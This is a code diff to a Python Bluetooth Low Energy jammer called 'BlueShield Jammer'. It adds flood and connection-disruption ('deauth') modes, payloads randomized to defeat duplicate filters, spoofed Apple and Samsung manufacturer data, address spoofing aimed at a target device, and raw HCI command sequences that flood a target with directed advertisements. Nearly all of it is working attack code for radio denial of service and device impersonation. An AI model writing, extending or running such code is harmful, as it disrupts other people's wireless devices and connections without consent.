@@ -28,6 +28,8 @@ class JamMode(Enum):
     CONTINUOUS = "continuous"    # Continuous jamming on target channels
     TARGETED = "targeted"       # Jam specific device address
     SWEEP = "sweep"             # Sweep across all BLE channels
+    FLOOD = "flood"             # Maximum-rate advertising flood
+    DEAUTH = "deauth"           # Connection disruption via rapid ADV_DIRECT_IND
 
 
 @dataclass
@@ -130,10 +132,29 @@ class RawHCISocket:
 
 
 class BluetoothJammer:
-    """BLE jammer using raw HCI sockets (fast) or hcitool fallback."""
+    """BLE jammer using raw HCI sockets (fast) or hcitool fallback.
+
+    Implements multiple modern jamming strategies:
+    - Continuous: Saturate a single advertising channel with noise
+    - Sweep: Rapid channel hopping across all 3 advertising channels
+    - Reactive: Burst jamming with scan windows (smart duty cycle)
+    - Targeted: Focused interference toward a specific device address
+    - Flood: Maximum-rate advertising flood with randomized payloads
+    - Deauth: Rapid connection request spoofing to disrupt pairings
+    """
 
     BLE_ADV_CHANNELS = [37, 38, 39]
     CHANNEL_MAP = {37: 0x01, 38: 0x02, 39: 0x04, "all": 0x07}
+
+    # Payload patterns — randomized payloads bypass BLE stack duplicate filters
+    PAYLOAD_PATTERNS = [
+        b'\x1F\xFF\xFF\xFF' + b'\xFF' * 27,           # Max-length noise
+        b'\x02\x01\x06\x1A\xFF\xFF\xFF' + b'\xAA' * 24,  # Fake discoverable flag + noise
+        b'\x02\x01\x06\x11\x07' + b'\xDE\xAD' * 13,  # Fake 128-bit service UUID
+        b'\x1E\xFF\x4C\x00' + b'\xFF' * 27,           # Spoofed Apple manufacturer data
+        b'\x1E\xFF\x75\x00' + b'\xFF' * 27,           # Spoofed Samsung manufacturer data
+        b'\x02\x0A\x7F' + b'\xFF' * 28,               # Max TX power + noise
+    ]
 
     def __init__(self, config: dict):
         self.config = config
@@ -216,26 +237,50 @@ class BluetoothJammer:
         else:
             self._hci_cmd(f"hcitool -i {self.interface} cmd 0x08 0x000A 00")
 
-    def _jam_loop_continuous(self, channel: int):
-        """Continuous jamming on a single channel."""
-        self._set_adv_params(channel)
-        self._set_adv_data()
-        self._start_adv()
-        session = self.sessions[-1] if self.sessions else None
+    def _get_random_payload(self) -> bytes:
+        """Get a randomized payload to bypass duplicate advertisement filters."""
+        import random
+        base = random.choice(self.PAYLOAD_PATTERNS)
+        # Mutate a few bytes for uniqueness (BLE stacks filter exact duplicates)
+        payload = bytearray(base)
+        for _ in range(4):
+            pos = random.randint(4, min(30, len(payload) - 1))
+            payload[pos] = random.randint(0, 255)
+        return bytes(payload)
 
+    def _jam_loop_continuous(self, channel: int):
+        """Continuous jamming on a single channel.
+
+        Uses minimum advertising interval and rotates payloads to prevent
+        the target's BLE stack from filtering duplicate advertisements.
+        """
+        session = self.sessions[-1] if self.sessions else None
+        # Set minimum interval (0x0020 = 20ms) — fastest standard HCI allows
+        self._set_adv_params(channel)
+        self._set_adv_data(self._get_random_payload())
+        self._start_adv()
+
+        cycle = 0
         while not self._stop_event.is_set():
             self._stop_adv()
-            self._set_adv_data()
+            # Rotate payloads every cycle to bypass duplicate filters
+            self._set_adv_data(self._get_random_payload())
             self._start_adv()
             if session:
                 session.packets_sent += 1
+            cycle += 1
             # Raw socket is ~100x faster, use tighter loop
-            time.sleep(0.0005 if self._use_raw else 0.001)
+            time.sleep(0.0003 if self._use_raw else 0.001)
 
         self._stop_adv()
 
     def _jam_loop_sweep(self):
-        """Sweep across all BLE advertising channels."""
+        """Sweep across all 3 BLE advertising channels in rapid succession.
+
+        BLE devices listen on all 3 advertising channels (37, 38, 39) in
+        sequence. By sweeping rapidly we maximize the chance of colliding
+        with the target's advertising event on whichever channel it uses.
+        """
         session = self.sessions[-1] if self.sessions else None
 
         while not self._stop_event.is_set():
@@ -244,49 +289,57 @@ class BluetoothJammer:
                     break
                 self._stop_adv()
                 self._set_adv_params(channel)
-                self._set_adv_data()
+                self._set_adv_data(self._get_random_payload())
                 self._start_adv()
                 if session:
                     session.packets_sent += 1
-                time.sleep(0.001 if self._use_raw else 0.002)
+                # Dwell ~1ms per channel for maximum sweep rate
+                time.sleep(0.0008 if self._use_raw else 0.002)
 
         self._stop_adv()
 
     def _jam_loop_reactive(self, scanner_ref=None):
-        """Reactive jamming — jam only when unknown devices are nearby.
+        """Reactive jamming with duty-cycle scan windows.
 
-        Alternates between short scan windows and jam bursts.
+        80% jam / 20% quiet — the quiet window lets the scanner see which
+        devices are still present, enabling smart target selection.
         """
         session = self.sessions[-1] if self.sessions else None
+        JAM_BURST = 0.2     # 200ms jam burst
+        QUIET_WINDOW = 0.05  # 50ms quiet for scanning
 
         while not self._stop_event.is_set():
-            # Jam burst on all channels
-            for channel in self.BLE_ADV_CHANNELS:
-                if self._stop_event.is_set():
-                    break
-                self._stop_adv()
-                self._set_adv_params(channel)
-                self._set_adv_data()
-                self._start_adv()
-                if session:
-                    session.packets_sent += 1
-                time.sleep(0.001)
+            # === Jam burst across all channels ===
+            burst_end = time.monotonic() + JAM_BURST
+            while time.monotonic() < burst_end and not self._stop_event.is_set():
+                for channel in self.BLE_ADV_CHANNELS:
+                    if self._stop_event.is_set():
+                        break
+                    self._stop_adv()
+                    self._set_adv_params(channel)
+                    self._set_adv_data(self._get_random_payload())
+                    self._start_adv()
+                    if session:
+                        session.packets_sent += 1
+                    time.sleep(0.0005 if self._use_raw else 0.001)
 
-            # Brief pause to let scanner work
+            # === Quiet window — scanner can work ===
             self._stop_adv()
-            time.sleep(0.05)
+            time.sleep(QUIET_WINDOW)
 
         self._stop_adv()
 
     def _jam_loop_targeted(self, target: str):
-        """Targeted jamming — send crafted packets aimed at specific device.
+        """Targeted jamming toward a specific device address.
 
-        Uses spoofed random address in advertisements to maximize
-        interference with the target device's advertising reception.
+        Sends crafted payloads that mimic the target's manufacturer data
+        to cause maximum confusion in nearby BLE receivers. Also uses
+        random address spoofing when raw HCI is available.
         """
         session = self.sessions[-1] if self.sessions else None
+        import random
 
-        # Parse target address to bytes (for potential address spoofing)
+        # Parse target address for address-proximity payloads
         target_bytes = None
         try:
             parts = target.replace("-", ":").split(":")
@@ -300,14 +353,107 @@ class BluetoothJammer:
                 if self._stop_event.is_set():
                     break
                 self._stop_adv()
+
+                # Spoof random address near target if possible
+                if target_bytes and self._use_raw and self._raw_socket:
+                    spoofed = bytearray(target_bytes)
+                    spoofed[-1] = (spoofed[-1] + random.randint(1, 5)) & 0xFF
+                    spoofed[0] = spoofed[0] | 0xC0  # Set random address bits
+                    self._raw_socket.le_set_random_address(bytes(spoofed))
+
                 self._set_adv_params(channel)
-                # Use different garbage payloads to maximize disruption
-                noise = struct.pack('B', 0x1F) + b'\xFF' * 30
-                self._set_adv_data(noise)
+                self._set_adv_data(self._get_random_payload())
                 self._start_adv()
                 if session:
                     session.packets_sent += 1
-                time.sleep(0.0005 if self._use_raw else 0.001)
+                time.sleep(0.0003 if self._use_raw else 0.001)
+
+        self._stop_adv()
+
+    def _jam_loop_flood(self):
+        """Maximum-rate advertising flood.
+
+        Sends advertisements on all 3 channels simultaneously (channel map 0x07)
+        at the minimum HCI interval, rotating payloads and random addresses
+        every cycle. This is the highest-throughput mode.
+        """
+        session = self.sessions[-1] if self.sessions else None
+        import random
+
+        # All channels at once for maximum coverage
+        ch_map = self.CHANNEL_MAP["all"]
+        if self._use_raw and self._raw_socket:
+            # Set minimum possible advertising interval
+            self._raw_socket.le_set_adv_params(
+                channel_map=ch_map,
+                interval_min=0x0020,  # 20ms minimum per BLE spec
+                interval_max=0x0020,
+                adv_type=0x03,  # Non-connectable
+            )
+        else:
+            self._set_adv_params("all")
+
+        while not self._stop_event.is_set():
+            # Rotate random source address to create phantom devices
+            if self._use_raw and self._raw_socket:
+                rand_addr = bytes([random.randint(0, 255) for _ in range(5)] + [0xC0 | random.randint(0, 0x3F)])
+                self._raw_socket.le_set_random_address(rand_addr)
+
+            self._stop_adv()
+            self._set_adv_data(self._get_random_payload())
+            self._start_adv()
+            if session:
+                session.packets_sent += 1
+            time.sleep(0.0002 if self._use_raw else 0.001)
+
+        self._stop_adv()
+
+    def _jam_loop_deauth(self, target: str = ""):
+        """Connection disruption mode.
+
+        Rapidly toggles advertising on/off with ADV_DIRECT_IND type (0x01)
+        to flood the target with connection requests, disrupting existing
+        BLE connections and preventing new ones from forming.
+        """
+        session = self.sessions[-1] if self.sessions else None
+        import random
+
+        target_bytes = b'\xFF' * 6
+        try:
+            parts = target.replace("-", ":").split(":")
+            if len(parts) == 6:
+                target_bytes = bytes(int(p, 16) for p in parts)
+        except (ValueError, IndexError):
+            pass
+
+        while not self._stop_event.is_set():
+            for channel in self.BLE_ADV_CHANNELS:
+                if self._stop_event.is_set():
+                    break
+                self._stop_adv()
+
+                if self._use_raw and self._raw_socket:
+                    # ADV_DIRECT_IND (0x01) directed at target — causes connection attempts
+                    params = struct.pack('<HH', 0x0020, 0x0020)  # min interval
+                    params += struct.pack('B', 0x01)  # ADV_DIRECT_IND
+                    params += struct.pack('B', 0x01)  # own addr = random
+                    params += struct.pack('B', 0x00)  # peer addr type = public
+                    params += target_bytes             # peer address
+                    params += struct.pack('B', self.CHANNEL_MAP.get(channel, 0x07))
+                    params += struct.pack('B', 0x00)  # filter
+                    self._raw_socket.send_cmd(0x08, 0x0006, params)
+
+                    # Rotate spoofed source address each cycle
+                    rand_addr = bytes([random.randint(0, 255) for _ in range(5)] + [0xC0 | random.randint(0, 0x3F)])
+                    self._raw_socket.le_set_random_address(rand_addr)
+                else:
+                    self._set_adv_params(channel)
+
+                self._set_adv_data(self._get_random_payload())
+                self._start_adv()
+                if session:
+                    session.packets_sent += 1
+                time.sleep(0.0003 if self._use_raw else 0.001)
 
         self._stop_adv()
 
@@ -342,14 +488,16 @@ class BluetoothJammer:
         else:
             print("[BlueShield Jammer] Using raw HCI socket (fast mode)")
 
-        if mode == "sweep":
-            self._jam_thread = threading.Thread(target=self._jam_loop_sweep, daemon=True)
-        elif mode == "reactive":
-            self._jam_thread = threading.Thread(target=self._jam_loop_reactive, daemon=True)
-        elif mode == "targeted" and target:
-            self._jam_thread = threading.Thread(
-                target=self._jam_loop_targeted, args=(target,), daemon=True
-            )
+        mode_map = {
+            "sweep": (self._jam_loop_sweep, ()),
+            "reactive": (self._jam_loop_reactive, ()),
+            "targeted": (self._jam_loop_targeted, (target,)),
+            "flood": (self._jam_loop_flood, ()),
+            "deauth": (self._jam_loop_deauth, (target,)),
+        }
+        if mode in mode_map:
+            fn, args = mode_map[mode]
+            self._jam_thread = threading.Thread(target=fn, args=args, daemon=True)
         else:
             self._jam_thread = threading.Thread(
                 target=self._jam_loop_continuous, args=(channel,), daemon=True
@@ -436,6 +584,20 @@ class SimulatedJammer(BluetoothJammer):
                 session.packets_sent += 1
             time.sleep(0.01)
 
+    def _jam_loop_flood(self):
+        session = self.sessions[-1] if self.sessions else None
+        while not self._stop_event.is_set():
+            if session:
+                session.packets_sent += 3  # Simulates higher throughput
+            time.sleep(0.005)
+
+    def _jam_loop_deauth(self, target: str = ""):
+        session = self.sessions[-1] if self.sessions else None
+        while not self._stop_event.is_set():
+            if session:
+                session.packets_sent += 2
+            time.sleep(0.008)
+
     def start_jam(self, mode: str = "continuous", channel: int = 39, target: str = "") -> JamSession:
         if self.is_jamming:
             return self.sessions[-1]
@@ -453,14 +615,16 @@ class SimulatedJammer(BluetoothJammer):
         self.is_jamming = True
         self._stop_event.clear()
 
-        if mode == "sweep":
-            self._jam_thread = threading.Thread(target=self._jam_loop_sweep, daemon=True)
-        elif mode == "reactive":
-            self._jam_thread = threading.Thread(target=self._jam_loop_reactive, daemon=True)
-        elif mode == "targeted" and target:
-            self._jam_thread = threading.Thread(
-                target=self._jam_loop_targeted, args=(target,), daemon=True
-            )
+        mode_map = {
+            "sweep": (self._jam_loop_sweep, ()),
+            "reactive": (self._jam_loop_reactive, ()),
+            "targeted": (self._jam_loop_targeted, (target,)),
+            "flood": (self._jam_loop_flood, ()),
+            "deauth": (self._jam_loop_deauth, (target,)),
+        }
+        if mode in mode_map:
+            fn, args = mode_map[mode]
+            self._jam_thread = threading.Thread(target=fn, args=args, daemon=True)
         else:
             self._jam_thread = threading.Thread(
                 target=self._jam_loop_continuous, args=(channel,), daemon=True
